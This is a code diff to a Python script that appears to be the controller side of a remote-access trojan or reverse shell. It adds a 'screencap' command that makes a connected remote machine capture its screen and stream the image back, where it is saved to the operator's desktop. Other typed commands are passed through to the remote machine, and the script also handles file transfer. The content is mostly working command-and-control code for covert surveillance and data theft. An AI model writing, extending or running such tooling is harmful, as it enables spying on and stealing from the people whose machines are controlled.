@@ -1,5 +1,6 @@
 import socket
 import os
+import time
 from fileinput import filename
 from tabnanny import check
 
@@ -77,6 +78,26 @@ def doSend(conn, sourcePath, destinationPath, fileName):
     #     print('[-] Unable to find the file')
     #     return
     #
+
+def transfer(conn, userinput, operation):
+    conn.send(userinput.encode())
+
+    if (operation == "screencap"):
+        fileName = f"ScreenCapture_{time.strftime('%m%d%Y_%H%M%S')}.jpg"
+        f = open('/home/zimm/Desktop/ScreenCaptures/'+fileName, 'wb')
+
+    while True:
+        bits = conn.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4])
+            f.close()
+            print("[+] Transfer Complete")
+            break
+        if 'File not found'.encode() in bits:
+            print("[-] Unable to find the file")
+            break
+        f.write(bits)
+
 def connect():
     mysocket = socket.socket()
     mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -101,6 +122,9 @@ def connect():
                 source = input("Scource path: ")
                 conn.send(userinput.encode())
                 doSend(conn, source, destination, fileName)
+
+            elif 'screencap' in userinput:
+                transfer(conn, userinput, "screencap")
 
             else:
                 conn.send(userinput.encode())
